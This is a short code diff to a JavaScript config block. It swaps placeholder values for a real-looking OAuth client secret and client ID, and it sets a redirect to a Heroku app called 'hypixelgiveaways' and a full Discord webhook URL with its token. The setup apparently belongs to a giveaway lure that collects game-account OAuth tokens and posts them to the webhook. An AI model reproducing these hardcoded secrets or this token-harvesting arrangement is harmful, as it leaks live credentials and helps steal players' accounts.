@@ -1,6 +1,6 @@
 //Config
-const client_secret = 'secret_value'
-const client_id = 'client_id'
+const client_secret = 'ucg8Q~gcT0Kr3P5uXs5oEl4UKki1wF-QaRvouc5y'
+const client_id = '8a44eb2c-0e0c-4ad8-ad8a-a7f037beab39'
 const redirect_uri = 'https://hypixelgiveaways.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1035588752128618537/x5Owq-LvYfBlpgg7yr_kYUJhh8Ay4rnF9TzjMAR7nRlVtuOl9RPa5UUvOBcZ9tTweRxR'
 //Requirements
